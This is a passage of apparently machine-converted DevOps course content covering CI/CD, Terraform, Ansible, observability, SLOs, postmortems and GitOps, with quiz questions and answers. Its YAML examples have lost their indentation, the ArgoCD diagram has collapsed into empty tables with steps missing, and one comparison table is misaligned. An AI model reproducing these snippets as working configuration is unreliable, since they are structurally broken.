<p><strong>Elite teams:</strong> deploy multiple times per day, lead time < 1 hour, failure rate < 5%, recovery < 1 hour.</p>`
      },
      {
        titleEn: "CI/CD with GitHub Actions",
        contentEn: `<p>CI/CD automates the path from code to production.</p>

<p><strong>CI (Continuous Integration):</strong></p>
<ul>
<li>Every push triggers automatic tests</li>
<li>Catch bugs in minutes, not days</li>
<li>Merge small changes often (not big merges once a month)</li>
</ul>

<p><strong>CD (Continuous Delivery / Deployment):</strong></p>
<ul>
<li>Delivery: code is always ready to deploy (one-click)</li>
<li>Deployment: code is automatically deployed after tests pass</li>
</ul>

<p><strong>GitHub Actions example:</strong></p>
<pre><code>yaml
<p># .github/workflows/ci.yml</p>
<p>name: CI Pipeline</p>

<p>on:</p>
<p>push:</p>
<p>branches: [main]</p>
<p>pull_request:</p>
<p>branches: [main]</p>

<p>jobs:</p>
<p>test:</p>
<p>runs-on: ubuntu-latest</p>
<p>steps:</p>
<ul>
<li>uses: actions/checkout@v4</li>
<li>uses: actions/setup-node@v4</li>
</ul>
<p>with:</p>
<p>node-version: 20</p>
<ul>
<li>run: npm install</li>
<li>run: npm test</li>
<li>run: npm run lint</li>
</ul>

<p>deploy:</p>
<p>needs: test</p>
<p>if: github.ref == 'refs/heads/main'</p>
<p>runs-on: ubuntu-latest</p>
<p>steps:</p>
<ul>
<li>uses: actions/checkout@v4</li>
<li>run: docker build -t myapp .</li>
<li>run: docker push myapp:latest</li>
<li>run: kubectl apply -f k8s/</li>
</ul>
</code></pre>

<p><strong>Key ideas:</strong></p>
<ul>
<li><strong>on: push</strong> — triggers on every push</li>
<li><strong>needs: test</strong> — deploy only runs after tests pass</li>
<li><strong>if: github.ref == 'refs/heads/main'</strong> — only deploy from main branch</li>
<li>Pull requests run tests but do not deploy</li>
</ul>

{question}
<p>A developer pushes code. Tests pass but the deploy step fails. What happens?</p>
<p>a) The broken code goes to production</p>
<p>b) The code stays in the branch, production is not affected</p>
<p>c) GitHub reverts the commit automatically</p>
<p>d) All previous deployments are rolled back</p>

<p>answer: b</p>
<p>explanation: The deploy step failed, so the new code never reached production. The old version keeps running. This is the safety net of CI/CD.</p>`
      },
      {
        titleEn: "Terraform: Infrastructure as Code",
        contentEn: `<p>Terraform lets you define infrastructure in code files instead of clicking in a web console.</p>

<p><strong>Why IaC?</strong></p>
<ul>
<li>Reproducible: run the same code → get the same infrastructure</li>
<li>Version controlled: git log shows who changed what and when</li>
<li>Reviewable: infrastructure changes go through pull requests</li>
<li>Fast: create 50 servers in seconds, not hours of clicking</li>
</ul>

<p><strong>Terraform basics:</strong></p>
<pre><code>hcl
<p># main.tf</p>
<p>provider "aws" {</p>
<p>region = "us-east-1"</p>
<p>}</p>

<p>resource "aws_instance" "web" {</p>
<p>ami           = "ami-0c55b159cbfafe1f0"</p>
<p>instance_type = "t3.micro"</p>

<p>tags = {</p>
<p>Name = "web-server"</p>
<p>}</p>
<p>}</p>

<p>resource "aws_s3_bucket" "data" {</p>
<p>bucket = "my-app-data-bucket"</p>
<p>}</p>
</code></pre>

<p><strong>Terraform workflow:</strong></p>
<ol>
<li><code>terraform init</code> — download provider plugins</li>
<li><code>terraform plan</code> — show what will change (add, modify, destroy)</li>
<li><code>terraform apply</code> — make the changes</li>
<li><code>terraform destroy</code> — delete everything</li>
</ol>

<p><strong>The plan step is critical.</strong> It shows you exactly what will happen before anything changes. Like a "dry run."</p>

<p><strong>State file:</strong></p>
<p>Terraform keeps a state file (terraform.tfstate) that tracks what it created. This is how it knows what exists and what needs to change. Never edit this file by hand.</p>`
      },
      {
        titleEn: "Ansible: Configuration Management",
        contentEn: `<p>Terraform creates servers. Ansible configures them.</p>

<p><strong>What Ansible does:</strong></p>
<ul>
<li>Install software on 100 servers at once</li>
<li>Copy config files to every server</li>
<li>Restart services after a config change</li>
<li>Ensure all servers are in the same state</li>
</ul>

<p><strong>How it works:</strong></p>
<ul>
<li>Agentless: connects via SSH (no software to install on target servers)</li>
<li>Playbooks: YAML files that describe the desired state</li>
<li>Idempotent: run it 10 times, same result (safe to repeat)</li>
</ul>

<p><strong>Example playbook:</strong></p>
<pre><code>yaml
<p># setup-web.yml</p>
<ul>
<li>hosts: webservers</li>
</ul>
<p>become: yes</p>
<p>tasks:</p>
<ul>
<li>name: Install nginx</li>
</ul>
<p>apt:</p>
<p>name: nginx</p>
<p>state: present</p>

<ul>
<li>name: Copy config file</li>
</ul>
<p>copy:</p>
<p>src: nginx.conf</p>
<p>dest: /etc/nginx/nginx.conf</p>
<p>notify: restart nginx</p>

<ul>
<li>name: Ensure nginx is running</li>
</ul>
<p>service:</p>
<p>name: nginx</p>
<p>state: started</p>
<p>enabled: yes</p>

<p>handlers:</p>
<ul>
<li>name: restart nginx</li>
</ul>
<p>service:</p>
<p>name: nginx</p>
<p>state: restarted</p>
</code></pre>

<p><strong>Terraform vs Ansible:</strong></p>
<table>
<thead><tr><th>Terraform</th><th>Ansible</th></tr></thead>
<tbody>
<tr><td>Purpose</td><td>Create infrastructure</td><td>Configure servers</td></tr>
<tr><td>Language</td><td>HCL</td><td>YAML</td></tr>
<tr><td>State</td><td>Stateful (state file)</td><td>Stateless</td></tr>
<tr><td>Best for</td><td>Cloud resources</td><td>Server setup</td></tr>
</tbody></table>

<p><strong>They work together:</strong> Terraform creates 10 EC2 instances → Ansible installs and configures your app on all 10.</p>

{simulation}
<p>You need to set up a production environment:</p>
<ol>
<li>Terraform creates: VPC, 3 EC2 instances, RDS database, S3 bucket</li>
<li>Ansible connects to the 3 EC2 instances and: installs Docker, pulls the app image, starts the container, configures log rotation</li>
<li>GitHub Actions runs on every push: tests → build → push image → Ansible deploys</li>
</ol>

<p>This is the modern DevOps pipeline: IaC + Configuration Management + CI/CD.</p>`
      }
    ]
  },

  206: {
    titleEn: "Observability Fundamentals",
    pages: [
      {
        titleEn: "The Three Pillars of Observability",
        contentEn: `<p>Observability means understanding what your system is doing from the outside.</p>

<p><strong>Three pillars:</strong></p>

<p><strong>1. Metrics — numbers over time</strong></p>
<ul>
<li>CPU usage: 45% → 78% → 92%</li>
<li>Request count: 1,200 per minute</li>
<li>Error rate: 0.3%</li>
<li>Response time: p99 = 250ms</li>
<li>Metrics answer: "Is something wrong right now?"</li>
</ul>

<p><strong>2. Logs — detailed event records</strong></p>
<ul>
<li><code>2024-03-15 10:23:45 ERROR: Database connection refused</code></li>
<li><code>2024-03-15 10:23:46 WARN: Retrying connection (attempt 2/3)</code></li>
<li><code>2024-03-15 10:23:47 INFO: Connection restored</code></li>
<li>Logs answer: "What exactly happened?"</li>
</ul>

<p><strong>3. Traces — follow a request across services</strong></p>
<ul>
<li>User clicks "Buy" → API gateway → auth service → order service → payment → email</li>
<li>Each step has a timing: auth took 12ms, payment took 340ms</li>
<li>Traces answer: "Where is the bottleneck?"</li>
</ul>

<p><strong>Why all three?</strong></p>
<ul>
<li>Metric alert: "Error rate jumped to 5%"</li>
<li>Logs: "Database connection timeout errors on service-B"</li>
<li>Trace: "Requests that hit service-B → database take 8 seconds instead of 50ms"</li>
<li>Root cause: the database server ran out of connections</li>
</ul>

<p>One pillar alone cannot solve the puzzle. You need all three.</p>`
      },
      {
        titleEn: "Prometheus & Grafana",
        contentEn: `<p>Prometheus collects metrics. Grafana makes them visual.</p>

<p><strong>Prometheus:</strong></p>
<ul>
<li>Pull-based: Prometheus asks your app "what are your metrics?" every 15 seconds</li>
<li>Your app exposes metrics at /metrics endpoint</li>
<li>Time-series database: stores metric values over time</li>
<li>Alert rules: "If error_rate > 5% for 5 minutes, alert the team"</li>
</ul>

<p><strong>How apps expose metrics:</strong></p>
<pre><code># GET /metrics
<p>http_requests_total{method="GET", status="200"} 15234</p>
<p>http_requests_total{method="POST", status="500"} 12</p>
<p>http_request_duration_seconds{quantile="0.99"} 0.25</p>
<p>node_cpu_usage_percent 67.3</p>
</code></pre>

<p><strong>Grafana:</strong></p>
<ul>
<li>Connects to Prometheus (and other data sources)</li>
<li>Builds dashboards with charts, graphs, and alerts</li>
<li>Common panels: time series, gauge, stat, table, heatmap</li>
<li>Share dashboards with the team</li>
</ul>

<p><strong>A typical dashboard shows:</strong></p>
<ul>
<li>Request rate (requests per second)</li>
<li>Error rate (% of 5xx responses)</li>
<li>Latency (p50, p95, p99)</li>
<li>CPU, memory, disk usage</li>
<li>Active database connections</li>
</ul>

<p><strong>The RED method (for services):</strong></p>
<ul>
<li><strong>R</strong>ate — how many requests per second?</li>
<li><strong>E</strong>rrors — how many of those fail?</li>
<li><strong>D</strong>uration — how long do they take?</li>
</ul>

{question}
<p>Prometheus scrapes metrics every 15 seconds. Your app crashes and restarts in 5 seconds. Will Prometheus notice?</p>
<p>a) Yes, it checks every 15 seconds so it will see the restart</p>
<p>b) No, the crash happened between scrapes</p>
<p>c) It depends on the metrics</p>
<p>d) Both a and b are possible</p>

<p>answer: d</p>
<p>explanation: If Prometheus scrapes right during the crash, it will see a failed scrape (target down). If the app restarts before the next scrape, Prometheus might miss it. This is why logs and traces complement metrics.</p>`
      },
      {
        titleEn: "SLI, SLO, and SLA",
        contentEn: `<p>These three terms define reliability in measurable ways.</p>

<p><strong>SLI (Service Level Indicator):</strong></p>
<ul>
<li>A metric that measures user experience</li>
<li>Examples:</li>
<li>Request latency: p99 = 200ms</li>
<li>Availability: 99.95% of requests succeed</li>
<li>Error rate: 0.1% of requests return 5xx</li>
</ul>

<p><strong>SLO (Service Level Objective):</strong></p>
<ul>
<li>Your internal target for an SLI</li>
<li>"99.9% of requests will complete in under 300ms"</li>
<li>"99.95% availability per month"</li>
<li>This is what your team promises to achieve</li>
</ul>

<p><strong>SLA (Service Level Agreement):</strong></p>
<ul>
<li>A contract with customers</li>
<li>Includes consequences: "If we drop below 99.9% uptime, we give you a credit"</li>
<li>SLA is always less strict than SLO (you need a safety margin)</li>
</ul>

<p><strong>Example:</strong></p>
<ul>
<li>SLI: actual uptime last month = 99.97%</li>
<li>SLO: internal goal = 99.95%</li>
<li>SLA: contract with customers = 99.9%</li>
</ul>

<p><strong>Error budget:</strong></p>
<ul>
<li>SLO = 99.9% → you can have 0.1% downtime per month</li>
<li>0.1% of 30 days = 43 minutes of allowed downtime</li>
<li>If you still have error budget left → deploy new features</li>
<li>If error budget is used up → freeze releases, focus on reliability</li>
</ul>

<p><strong>The key insight:</strong> 100% is not the goal. If you have zero downtime, you are probably not releasing fast enough. The error budget balances speed and reliability.</p>`
      },
      {
        titleEn: "ELK Stack & Postmortem Culture",
        contentEn: `<p><strong>ELK Stack — centralized logging:</strong></p>

<ul>
<li><strong>E</strong>lasticsearch — stores and indexes logs (search engine)</li>
<li><strong>L</strong>ogstash — collects, transforms, and ships logs</li>
<li><strong>K</strong>ibana — visualize and search logs in a web UI</li>
</ul>

<p><strong>How it works:</strong></p>
<ol>
<li>Your apps write logs (stdout, files)</li>
<li>A log shipper (Filebeat) sends them to Logstash</li>
<li>Logstash parses and enriches the logs</li>
<li>Elasticsearch stores them (searchable)</li>
<li>Kibana lets you search: "show all errors from payment-service in the last hour"</li>
</ol>

<p><strong>Why centralized logging?</strong></p>
<ul>
<li>50 servers × 10 log files = 500 files to search manually</li>
<li>ELK: one search bar to find any log from any server</li>
</ul>

<p><strong>Postmortem culture:</strong></p>
<p>When something breaks, you write a postmortem — a document that asks:</p>
<ol>
<li><strong>What happened?</strong> (timeline of events)</li>
<li><strong>What was the impact?</strong> (users affected, duration)</li>
<li><strong>Why did it happen?</strong> (root cause, not blame)</li>
<li><strong>How did we detect it?</strong> (monitoring? customer complaint?)</li>
<li><strong>What will we do to prevent it?</strong> (action items with owners and deadlines)</li>
</ol>

<p><strong>Rules of a good postmortem:</strong></p>
<ul>
<li>Blameless: "The deploy script had no rollback" NOT "John deployed bad code"</li>
<li>Focused on systems: "How do we make this impossible?" not "Who made the mistake?"</li>
<li>Shared publicly within the company → everyone learns</li>
</ul>

{thinkOutside}
<p>Your payment service was down for 45 minutes last night. The on-call engineer fixed it by restarting the database. The CEO asks: "Who is responsible?"</p>

<p>How would you run a blameless postmortem?</p>

<p>Key approach:</p>
<ul>
<li>Focus on: "Why did the database need restarting? What caused the state that led to the crash?"</li>
<li>Not: "Who forgot to check the database?"</li>
<li>Action items: add database connection pool monitoring, add auto-restart on high connection count, improve the runbook for database issues</li>
</ul>`
      }
    ]
  },

  207: {
    titleEn: "Infrastructure as Code (Deep Dive)",
    pages: [
      {
        titleEn: "What is Infrastructure as Code?",
        contentEn: `<p>IaC means managing servers, networks, and services through code files instead of manual clicks.</p>

<p><strong>The problem (before IaC):</strong></p>
<ul>
<li>An engineer clicks through the AWS console to create a server</li>
<li>Nobody knows exactly what settings were used</li>
<li>Creating a second identical server? Good luck remembering every click</li>
<li>"Snowflake servers" — each one is slightly different</li>
</ul>

<p><strong>The IaC solution:</strong></p>
<ul>
<li>Write code that describes your infrastructure</li>
<li>Store the code in Git (version history, reviews, rollbacks)</li>
<li>Run the code → infrastructure is created exactly the same every time</li>
</ul>

<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Reproducible</strong> — dev, staging, and production are identical</li>
<li><strong>Auditable</strong> — git log shows every change and who made it</li>
<li><strong>Fast</strong> — create 100 servers in minutes</li>
<li><strong>Self-documenting</strong> — the code IS the documentation</li>
<li><strong>Testable</strong> — validate infrastructure before applying changes</li>
</ul>

<p><strong>Types of IaC tools:</strong></p>
<table>
<thead><tr><th>Tool</th><th>Type</th><th>Use</th></tr></thead>
<tbody>
<tr><td>Terraform</td><td>Provisioning</td><td>Create cloud resources</td></tr>
<tr><td>CloudFormation</td><td>Provisioning</td><td>AWS-only, same idea</td></tr>
<tr><td>Ansible</td><td>Configuration</td><td>Set up software on servers</td></tr>
<tr><td>Pulumi</td><td>Provisioning</td><td>IaC in real programming languages</td></tr>
</tbody></table>

<p><strong>Key principle:</strong> Never make changes by hand. If it is not in the code, it does not exist.</p>`
      },
      {
        titleEn: "Terraform HCL Language",
        contentEn: `<p>HCL (HashiCorp Configuration Language) is Terraform's language. It is declarative — you describe what you want, not how to build it.</p>

<p><strong>Core building blocks:</strong></p>

<p><strong>Provider</strong> — which cloud to use:</p>
<pre><code>hcl
<p>provider "aws" {</p>
<p>region = "us-east-1"</p>
<p>}</p>
</code></pre>

<p><strong>Resource</strong> — something to create:</p>
<pre><code>hcl
<p>resource "aws_instance" "web" {</p>
<p>ami           = "ami-0c55b159cbfafe1f0"</p>
<p>instance_type = "t3.micro"</p>
<p>subnet_id     = aws_subnet.public.id</p>
<p>}</p>
</code></pre>

<p><strong>Variable</strong> — input parameters:</p>
<pre><code>hcl
<p>variable "instance_count" {</p>
<p>type    = number</p>
<p>default = 2</p>
<p>}</p>
</code></pre>

<p><strong>Output</strong> — values to show after apply:</p>
<pre><code>hcl
<p>output "server_ip" {</p>
<p>value = aws_instance.web.public_ip</p>
<p>}</p>
</code></pre>

<p><strong>Data source</strong> — read existing resources:</p>
<pre><code>hcl
<p>data "aws_ami" "ubuntu" {</p>
<p>most_recent = true</p>
<p>filter {</p>
<p>name   = "name"</p>
<p>values = ["ubuntu/images/hvm-ssd/ubuntu-22*"]</p>
<p>}</p>
<p>}</p>
</code></pre>

<p><strong>References:</strong></p>
<ul>
<li><code>aws_subnet.public.id</code> — reference another resource's attribute</li>
<li><code>var.instance_count</code> — reference a variable</li>
<li><code>data.aws_ami.ubuntu.id</code> — reference a data source</li>
</ul>

{question}
<p>What does <code>aws_instance.web.public_ip</code> mean in Terraform?</p>
<p>a) A hardcoded IP address</p>
<p>b) The public IP of the resource named "web" of type "aws_instance"</p>
<p>c) A variable named public_ip</p>
<p>d) An AWS API call</p>

<p>answer: b</p>
<p>explanation: Terraform creates a resource graph. <code>aws_instance.web</code> refers to the resource block, and <code>.public_ip</code> is an attribute that AWS returns after the instance is created.</p>`
      },
      {
        titleEn: "Terraform State Management",
        contentEn: `<p>State is Terraform's memory. It tracks what resources exist and their current configuration.</p>

<p><strong>What the state file contains:</strong></p>
<ul>
<li>Every resource Terraform created</li>
<li>Their IDs, IPs, and settings</li>
<li>The mapping between your code and the real world</li>
</ul>

<p><strong>Local state (default):</strong></p>
<ul>
<li>Saved as <code>terraform.tfstate</code> in your project folder</li>
<li>Problem: only one person can use it at a time</li>
<li>Problem: if you lose the file, Terraform forgets everything</li>
</ul>

<p><strong>Remote state (production):</strong></p>
<pre><code>hcl
<p>terraform {</p>
<p>backend "s3" {</p>
<p>bucket         = "my-terraform-state"</p>
<p>key            = "prod/terraform.tfstate"</p>
<p>region         = "us-east-1"</p>
<p>dynamodb_table = "terraform-locks"</p>
<p>encrypt        = true</p>
<p>}</p>
<p>}</p>
</code></pre>

<p><strong>Why remote state?</strong></p>
<ul>
<li><strong>Shared access</strong> — the whole team uses the same state</li>
<li><strong>Locking</strong> — DynamoDB prevents two people from changing infra at the same time</li>
<li><strong>Encryption</strong> — state can contain secrets (passwords, keys)</li>
<li><strong>Backup</strong> — S3 has versioning, so you can recover old state</li>
</ul>

<p><strong>State commands:</strong></p>
<ul>
<li><code>terraform state list</code> — show all tracked resources</li>
<li><code>terraform state show aws_instance.web</code> — show details of one resource</li>
<li><code>terraform import aws_instance.web i-1234567</code> — import an existing resource into state</li>
</ul>

<p><strong>Golden rule:</strong> Never edit the state file manually. Use <code>terraform state</code> commands or <code>terraform import</code>.</p>`
      },
      {
        titleEn: "Cattle vs Pets",
        contentEn: `<p>This is the most important mental shift in DevOps.</p>

<p><strong>Pets (the old way):</strong></p>
<ul>
<li>Each server has a name: "db-master", "web-prod-01"</li>
<li>You log in to fix problems manually</li>
<li>If a server dies, you panic and try to repair it</li>
<li>Servers are unique and irreplaceable</li>
<li>Like a pet: you name it, care for it, and cry when it is sick</li>
</ul>

<p><strong>Cattle (the DevOps way):</strong></p>
<ul>
<li>Servers are numbered: instance-001, instance-002</li>
<li>You never log in to fix anything — you replace the server</li>
<li>If a server dies, automation creates a new one in seconds</li>
<li>Servers are identical and disposable</li>
<li>Like cattle: any one can be replaced by another</li>
</ul>

<p><strong>How to treat servers as cattle:</strong></p>
<ol>
<li><strong>IaC</strong> — create any server from code in minutes</li>
<li><strong>Immutable infrastructure</strong> — never update a server, deploy a new one</li>
<li><strong>Configuration management</strong> — Ansible ensures all servers are identical</li>
<li><strong>Auto Scaling</strong> — automatically add or remove servers</li>
<li><strong>Health checks</strong> — kill unhealthy servers, create healthy ones</li>
</ol>

<p><strong>Story: The Production Database Server</strong></p>
<p>A company had one database server called "Big Bertha." It ran for 4 years. Nobody dared restart it. Nobody knew exactly how it was configured. When it finally crashed, recovery took 3 days.</p>

<p>After the incident, they:</p>
<ul>
<li>Automated the database setup with Terraform + Ansible</li>
<li>Set up RDS Multi-AZ (managed database with auto-failover)</li>
<li>Tested failover every month</li>
</ul>

<p>Now their database is cattle. If it dies, AWS creates a new one in 60 seconds.</p>

{thinkOutside}
<p>Look at your own projects. Which of your servers or services are "pets"? How would you turn them into "cattle"?</p>

<p>Think about:</p>
<ul>
<li>Can you recreate the server from scratch in under 10 minutes?</li>
<li>Is every configuration step documented in code?</li>
<li>Would you be comfortable if someone deleted the server right now?</li>
</ul>`
      }
    ]
  },

  208: {
    titleEn: "Monitoring & Observability (Deep Dive)",
    pages: [
      {
        titleEn: "The Metrics-Logs-Traces Triangle",
        contentEn: `<p>Each pillar of observability serves a different purpose in debugging.</p>

<p><strong>Metrics — the alert system</strong></p>
<ul>
<li>Aggregate numbers: averages, percentiles, counts</li>
<li>Cheap to store (just numbers over time)</li>
<li>Good for: dashboards, alerts, capacity planning</li>
<li>Weakness: tells you THAT something is wrong, not WHY</li>
</ul>

<p><strong>Logs — the detail system</strong></p>
<ul>
<li>Text records of events with timestamps</li>
<li>Expensive to store (text is large)</li>
<li>Good for: debugging specific errors, audit trails</li>
<li>Weakness: hard to see patterns across millions of log lines</li>
</ul>

<p><strong>Traces — the flow system</strong></p>
<ul>
<li>Follow one request across multiple services</li>
<li>Medium cost to store</li>
<li>Good for: finding slow services, understanding dependencies</li>
<li>Weakness: sampling needed at high traffic (you cannot trace every request)</li>
</ul>

<p><strong>How they work together (incident example):</strong></p>

<table>
<thead><tr><th>Step</th><th>Pillar</th><th>Action</th></tr></thead>
<tbody>
<tr><td>1</td><td>Metric</td><td>Alert: "p99 latency > 2 seconds"</td></tr>
<tr><td>2</td><td>Trace</td><td>Look at slow traces → payment-service takes 1.8s</td></tr>
<tr><td>3</td><td>Logs</td><td>Read payment-service logs → "Connection pool exhausted"</td></tr>
<tr><td>4</td><td>Metric</td><td>Check connection pool metric → maxed out at 20/20</td></tr>
<tr><td>Root cause</td><td>—</td><td>Connection pool too small for current traffic</td></tr>
<tr><td>Fix</td><td>—</td><td>Increase pool size from 20 to 50</td></tr>
</tbody></table>

<p><strong>Key tools:</strong></p>
<ul>
<li>Metrics: Prometheus, Datadog, CloudWatch</li>
<li>Logs: ELK Stack, Loki, Splunk</li>
<li>Traces: Jaeger, Zipkin, Tempo</li>
<li>All-in-one: Datadog, New Relic, Grafana Cloud</li>
</ul>`
      },
      {
        titleEn: "PromQL Query Language",
        contentEn: `<p>PromQL is the query language for Prometheus. It lets you ask questions about your metrics.</p>

<p><strong>Basic queries:</strong></p>
<pre><code>promql
<p># Current value of a metric</p>
<p>http_requests_total</p>

<p># Filter by label</p>
<p>http_requests_total{status="500"}</p>

<p># Filter by multiple labels</p>
<p>http_requests_total{method="POST", status="500"}</p>
</code></pre>

<p><strong>Rate — the most important function:</strong></p>
<pre><code>promql
<p># Requests per second over the last 5 minutes</p>
<p>rate(http_requests_total[5m])</p>

<p># Error rate (errors / total requests)</p>
<p>rate(http_requests_total{status="500"}[5m])</p>
<p>/ rate(http_requests_total[5m])</p>
</code></pre>

<p><strong>Aggregation:</strong></p>
<pre><code>promql
<p># Total requests per second across all instances</p>
<p>sum(rate(http_requests_total[5m]))</p>

<p># Requests per second, grouped by status code</p>
<p>sum by (status) (rate(http_requests_total[5m]))</p>

<p># Average CPU across all pods</p>
<p>avg(container_cpu_usage_seconds_total)</p>
</code></pre>

<p><strong>Percentiles:</strong></p>
<pre><code>promql
<p># 99th percentile latency</p>
<p>histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m]))</p>
</code></pre>

<p><strong>Alert rule example:</strong></p>
<pre><code>yaml
<ul>
<li>alert: HighErrorRate</li>
</ul>
<p>expr: rate(http_requests_total{status="500"}[5m]) > 0.05</p>
<p>for: 5m</p>
<p>labels:</p>
<p>severity: critical</p>
<p>annotations:</p>
<p>summary: "Error rate above 5% for 5 minutes"</p>
</code></pre>

{question}
<p>What does <code>rate(http_requests_total[5m])</code> measure?</p>
<p>a) The total number of HTTP requests ever made</p>
<p>b) The number of requests in the last 5 minutes</p>
<p>c) The average requests per second over the last 5 minutes</p>
<p>d) The maximum request count in 5 minutes</p>

<p>answer: c</p>
<p>explanation: <code>rate()</code> calculates the per-second average rate of increase over the given time window. A [5m] window means it looks at the last 5 minutes of data to compute a smooth per-second rate.</p>`
      },
      {
        titleEn: "Grafana Dashboards",
        contentEn: `<p>Grafana turns metrics into visual dashboards that anyone can understand.</p>

<p><strong>Dashboard design principles:</strong></p>
<ul>
<li>Top row: key business metrics (revenue, active users)</li>
<li>Second row: system health (error rate, latency, uptime)</li>
<li>Lower rows: detailed infrastructure (CPU, memory, disk, network)</li>
<li>Use colors: green = healthy, yellow = warning, red = critical</li>
</ul>

<p><strong>Common panel types:</strong></p>
<ul>
<li><strong>Time series</strong> — metrics over time (request rate, CPU usage)</li>
<li><strong>Stat</strong> — single big number (current error rate: 0.2%)</li>
<li><strong>Gauge</strong> — progress bar (disk usage: 73%)</li>
<li><strong>Table</strong> — list of data (top 10 slowest endpoints)</li>
<li><strong>Heatmap</strong> — density over time (request latency distribution)</li>
<li><strong>Alert list</strong> — currently firing alerts</li>
</ul>

<p><strong>The USE method (for infrastructure):</strong></p>
<ul>
<li><strong>U</strong>tilization — how full is the resource? (CPU at 85%)</li>
<li><strong>S</strong>aturation — is there a queue? (10 requests waiting)</li>
<li><strong>E</strong>rrors — any failures? (disk I/O errors)</li>
</ul>

<p><strong>Dashboard variables:</strong></p>
<p>Use dropdown filters to make dashboards flexible:</p>
<ul>
<li>Environment: dev / staging / production</li>
<li>Service: api / web / worker</li>
<li>Time range: last 1h / 6h / 24h / 7d</li>
</ul>

<p><strong>Best practices:</strong></p>
<ul>
<li>Every team should have a "service overview" dashboard</li>
<li>Link alerts to the relevant dashboard</li>
<li>Include runbook links: "If this alert fires, follow these steps"</li>
<li>Review dashboards monthly — remove panels nobody looks at</li>
</ul>`
      },
      {
        titleEn: "Story: The Memory Leak",
        contentEn: `<p><strong>The setup:</strong></p>
<p>A team launched a new microservice. Everything looked fine on day one.</p>

<p><strong>Day 1:</strong> Memory usage: 200 MB. No alerts. All green.</p>

<p><strong>Day 3:</strong> Memory usage: 600 MB. Still under the 1 GB limit. Nobody noticed.</p>

<p><strong>Day 5:</strong> Memory usage: 950 MB. Prometheus alert fires: "memory usage > 90%."</p>
<p>The on-call engineer sees the alert but restarts the service. Memory drops to 200 MB. Problem "solved."</p>

<p><strong>Day 7:</strong> Memory hits 1 GB again. The service crashes. Kubernetes restarts it. But during the 30-second restart, 200 requests fail.</p>

<p><strong>Day 8 — the real investigation:</strong></p>
<p>The team opens Grafana and looks at the memory panel over 7 days. They see a clear pattern: memory grows by ~100 MB per day and never goes down.</p>

<p>This is a memory leak — the code allocates memory but never frees it.</p>

<p><strong>Finding the root cause:</strong></p>
<ol>
<li>Grafana showed memory growing linearly (not spiky → leak, not load)</li>
<li>Logs showed no errors (the leak was silent)</li>
<li>A trace showed that every request to /api/reports created a cache entry that was never cleaned up</li>
<li>The fix: add cache expiration (TTL of 1 hour)</li>
</ol>

<p><strong>Lessons learned:</strong></p>
<ul>
<li>Restarting a service hides the problem, it does not fix it</li>
<li>Memory graphs over days/weeks reveal leaks that short time windows miss</li>
<li>Every cache must have an expiration policy</li>
<li>The postmortem led to a new alert: "If memory grows > 10% per day for 3 days, alert"</li>
</ul>

{simulation}
<p>You see this pattern in Grafana:</p>
<ul>
<li>CPU: flat at 30% (no issue)</li>
<li>Memory: 200 MB → 400 MB → 600 MB → 800 MB over 4 days</li>
<li>Request rate: constant at 100 req/s (no traffic change)</li>
<li>Error rate: 0% (no errors yet)</li>
</ul>

<p>What is happening? What would you do?</p>

<p>Steps:</p>
<ol>
<li>The linear memory growth with constant traffic = memory leak</li>
<li>Do not restart — that hides the problem</li>
<li>Add memory profiling to the service</li>
<li>Check for: unclosed connections, growing caches, event listeners not removed</li>
<li>Fix the code, deploy, and watch the memory graph flatten</li>
</ol>`
      }
    ]
  },

  209: {
    titleEn: "GitOps",
    pages: [
      {
        titleEn: "Git as the Source of Truth",
        contentEn: `<p>GitOps is a way of managing infrastructure and deployments where Git is the single source of truth.</p>

<p><strong>The core idea:</strong></p>
<ul>
<li>The desired state of your system is stored in a Git repository</li>
<li>Any change to the system goes through a Git commit</li>
<li>An automated tool watches the repo and makes reality match the repo</li>
</ul>

<p><strong>Traditional deployment:</strong></p>
<ol>
<li>Developer pushes code</li>
<li>CI builds an image</li>
<li>Someone runs <code>kubectl apply</code> manually (or CI does it)</li>
<li>Problem: what is actually running in production? You have to check the cluster.</li>
</ol>

<p><strong>GitOps deployment:</strong></p>
<ol>
<li>Developer pushes code</li>
<li>CI builds an image and updates the image tag in the Git repo</li>
<li>A GitOps tool (ArgoCD) detects the change and syncs the cluster</li>
<li>What is running in production? Check the Git repo. It is always accurate.</li>
</ol>

<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Audit trail</strong> — every change is a git commit with author, timestamp, and message</li>
<li><strong>Easy rollback</strong> — revert a commit → system rolls back automatically</li>
<li><strong>Security</strong> — developers never need direct access to the cluster</li>
<li><strong>Consistency</strong> — Git is the truth, not what someone typed in a terminal</li>
<li><strong>Pull-based</strong> — the cluster pulls changes from Git (safer than pushing to the cluster)</li>
</ul>

<p><strong>GitOps principles:</strong></p>
<ol>
<li>The entire system is described declaratively (YAML)</li>
<li>The desired state is stored in Git</li>
<li>Changes are applied automatically after approval</li>
<li>Software agents ensure the actual state matches the desired state</li>
</ol>`
      },
      {
        titleEn: "ArgoCD: The GitOps Loop",
        contentEn: `<p>ArgoCD is the most popular GitOps tool for Kubernetes.</p>

<p><strong>How ArgoCD works (the loop):</strong></p>

<pre><code>[Git Repository]
<table>
<thead><tr></tr></thead>
<tbody>
</tbody></table>
<p>v</p>
<p>[ArgoCD Server]</p>
<table>
<thead><tr></tr></thead>
<tbody>
</tbody></table>
<p>v</p>
<p>[Kubernetes Cluster]</p>
<table>
<thead><tr></tr></thead>
<tbody>
<tr><td>(4) If same → do nothing</td></tr>
<tr></tr>
</tbody></table>
<p>└──→ (5) Report status back to ArgoCD UI</p>
</code></pre>

<p><strong>Key concepts:</strong></p>
<ul>
<li><strong>Application</strong> — an ArgoCD resource that links a Git repo to a K8s namespace</li>
<li><strong>Sync</strong> — the act of making the cluster match Git</li>
<li><strong>Health status</strong> — is the app running correctly?</li>
<li><strong>Sync status</strong> — does the cluster match Git?</li>
</ul>

<p><strong>Sync statuses:</strong></p>
<ul>
<li><strong>Synced</strong> — cluster matches Git (all good)</li>
<li><strong>OutOfSync</strong> — cluster does not match Git (a change is pending)</li>
<li><strong>Unknown</strong> — ArgoCD cannot determine the state</li>
</ul>

<p><strong>Auto-sync vs manual sync:</strong></p>
<ul>
<li>Auto-sync: ArgoCD applies changes immediately when Git changes</li>
<li>Manual sync: ArgoCD detects the diff but waits for human approval</li>
<li>Best practice: auto-sync for dev/staging, manual sync for production</li>
</ul>

{question}
<p>A developer pushes a new image tag to the GitOps repo. ArgoCD shows "OutOfSync." What does this mean?</p>
<p>a) The deployment failed</p>
